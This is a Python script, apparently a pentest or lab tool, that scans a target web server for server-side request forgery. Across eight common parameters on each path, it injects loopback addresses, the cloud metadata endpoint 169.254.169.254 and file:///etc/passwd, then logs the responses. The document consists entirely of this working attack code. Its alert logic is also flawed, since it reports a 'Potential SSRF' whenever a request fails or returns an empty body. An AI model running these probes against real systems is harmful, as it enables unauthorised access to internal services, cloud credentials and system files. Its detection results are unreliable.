import aiohttp
import asyncio
import argparse
import datetime
import os
from urllib.parse import urlencode

# Common SSRF internal targets
INTERNAL_URLS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254",  # AWS
    "http://[::1]",
    "file:///etc/passwd"
]

PARAMS = ["url", "path", "redirect", "dest", "next", "data", "link", "target"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (SSRF-Tester)"
}


async def test_param(session, base_url, param, target_url):
    payload = {param: target_url}
    full_url = f"{base_url}?{urlencode(payload)}"
    try:
        async with session.get(full_url, timeout=5) as resp:
            text = await resp.text()
            return {
                "url": full_url,
                "status": resp.status,
                "length": len(text),
                "param": param,
                "target": target_url
            }
    except Exception as e:
        return {
            "url": full_url,
            "status": None,
            "length": 0,
            "param": param,
            "target": target_url,
            "error": str(e)
        }


async def verify_ssrf(paths, output_log):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(output_log, 'a') as log:
        log.write(f"\n[+] SSRF Verification Started: {timestamp}\n")

    async with aiohttp.ClientSession(headers=HEADERS) as session:
        tasks = []
        for path in paths:
            for param in PARAMS:
                for target in INTERNAL_URLS:
                    tasks.append(test_param(session, path, param, target))

        results = await asyncio.gather(*tasks)

        for r in results:
            ext_status = r['status'] if r['status'] is not None else 'ERR'
            ext_len = r['length']
            line = f"[>] {r['url']} | Status: {ext_status} | Len: {ext_len}"
            print(line)
            with open(output_log, 'a') as log:
                log.write(line + "\n")

            if ext_status is None or ext_len == 0:
                ssrf_alert = f"[!!!] Potential SSRF: {r['url']}"
                print(ssrf_alert)
                with open(output_log, 'a') as log:
                    log.write(ssrf_alert + "\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Verify SSRF on known paths")
    parser.add_argument("-u", "--url", help="Base URL (e.g., http://10.10.10.10:1337)", required=True)
    parser.add_argument("-p", "--paths", help="Comma-separated list of paths (e.g., /admin,/index.php)", required=True)
    parser.add_argument("-o", "--output", help="Log output file", default=f"ssrf_verify_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

    args = parser.parse_args()

    base = args.url.rstrip('/')
    full_paths = [base + path if not path.startswith('http') else path for path in args.paths.split(",")]
    print(f"[+] Verifying {len(full_paths)} paths against common SSRF payloads...")
    asyncio.run(verify_ssrf(full_paths, args.output))
    print("[+] Done.")
